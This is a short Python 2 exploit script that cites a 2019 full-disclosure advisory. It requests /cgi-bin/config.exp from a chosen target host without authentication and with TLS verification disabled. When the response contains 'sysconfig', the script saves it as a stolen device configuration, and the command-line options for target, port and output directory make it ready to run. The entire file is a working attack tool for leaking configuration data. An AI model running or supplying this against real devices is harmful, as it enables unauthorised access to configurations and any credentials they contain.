#!/usr/bin/python
# coding: utf-8
# ref: https://seclists.org/fulldisclosure/2019/Jan/52
import argparse
import requests
import sys
# nuke https warnings...
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def write_file(data, outfile):
    try:
        f = open(outfile, "w")
    except Exception, e:
        sys.exit("{!} Exception hit while opening file, printing...\n%s" %(str(e)))
    try:
        f.write(data)
    except Exception, e:
        sys.exit("{!} Exception hit while writing data, printing...\n%s" %(str(e)))
    f.close()

def get_config(host="127.0.0.1", port="443", ssl=True, output_directory="output"):
    outfile = "%s/%s_%s.conf" %(output_directory, host, port)
    if ssl == True:
        url = "https://%s:%s/cgi-bin/config.exp" %(host, port)
    else:
        url = "http://%s:%s/cgi-bin/config.exp" %(host, port)
    try:
        print "{+} Sending request to %s" %(url)
        r = requests.get(url, verify=False)
    except Exception, e:
        sys.exit("{!} Exception while sending request, printing...\n%s" %(str(e)))
    if "sysconfig" in r.text:
        print "{*} We seem to have found a valid config! Writing to %s" %(outfile)
        write_file(data=r.text, outfile=outfile)
    else:
        sys.exit("{-} Doesn't seem to be what we are looking for, quitting!")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help="Target host", required=True)
    parser.add_argument('-d', '--directory', default="output", help="Output directory...")
    parser.add_argument('-s', '--ssl', action="store_true", default=True, help="Use SSL")
    parser.add_argument('-p', '--port', default="443", help="Target port")
    args = parser.parse_args()
    get_config(host=args.target, port=args.port, ssl=args.ssl, output_directory=args.directory)


if __name__ == "__main__":
    main()
